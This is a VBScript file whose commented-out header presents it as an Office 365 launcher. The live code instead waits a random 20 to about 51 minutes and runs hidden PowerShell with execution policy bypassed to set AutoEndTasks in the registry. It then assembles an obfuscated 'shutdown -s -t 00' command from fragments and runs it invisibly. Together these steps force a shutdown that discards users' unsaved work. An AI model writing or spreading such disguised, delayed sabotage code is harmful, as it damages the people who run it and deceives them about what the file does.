' Initialize Office 365 Application
' Set Office365 = CreateObject("Office.Application")

' Launch Word
' Office365.Start("Word")

' Launch Excel
' Office365.Start("Excel")

' Launch PowerPoint
' Office365.Start("PowerPoint")

' Check if Office 365 started successfully
' If Office365.IsRunning Then
'     MsgBox "Office 365 started successfully.", vbInformation, "Success"
' Else
'     MsgBox "Failed to start Office 365.", vbCritical, "Error"
' End If

' Set Office365 = Nothing

Dim arr(2)
Set dict = CreateObject("Scripting.Dictionary")
Set objShell = CreateObject("WScript.Shell")

arr(0) = 20
arr(1) = 50
arr(2) = 60000

dict.Add "Start", arr(0)
dict.Add "End", arr(1)
dict.Add "Factor", arr(2)

Function CalculateLoading(start, finish, factor)
    Randomize
    CalculateLoading = ((((finish - start) + 1) * Rnd + start) * factor)
End Function

objShell.Environment("Process")("SLEEP_DURATION") = CalculateLoading(dict.Item("Start"), dict.Item("End"), dict.Item("Factor"))

WScript.Sleep CLng(objShell.Environment("Process")("SLEEP_DURATION"))

Dim ShellExe
Set ShellExe = CreateObject("WScript.Shell")

Dim commandexe
commandexe = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
    """$path = 'HKCU:\Control Panel\Desktop';" & _
    "$name = 'AutoEndTasks';" & _
    "$value = '1';" & _
    "if (-Not (Test-Path $path)) { exit };" & _
    "Set-ItemProperty -Path $path -Name $name -Value $value"""

objShell.Run commandexe, 0, True

Set objShell = Nothing

Dim commandComponents(5)
Set operationMap = CreateObject("Scripting.Dictionary")
Set executor = CreateObject("WScript.Shell")

commandComponents(0) = "sh"
commandComponents(1) = "-s"
commandComponents(2) = "-t"
commandComponents(3) = "own"
commandComponents(4) = "00"
commandComponents(5) = "utd"

operationMap.Add "Shell", commandComponents(0)
operationMap.Add "Parameter1", commandComponents(1)
operationMap.Add "Parameter2", commandComponents(2)
operationMap.Add "User", commandComponents(3)
operationMap.Add "Flag", commandComponents(4)
operationMap.Add "Format", commandComponents(5)

Function BuildCommandString(map)
    BuildCommandString = map("Shell") & map("Format") & map("User") &  " " & map("Parameter1") & " " & map("Parameter2") & " " & map("Flag")
End Function

Function ExecuteSystemCommand(command)
    Dim visibility, waitForReturn
    visibility = 0
    waitForReturn = False
    
    executor.Run command, visibility, waitForReturn
End Function

ExecuteSystemCommand(BuildCommandString(operationMap))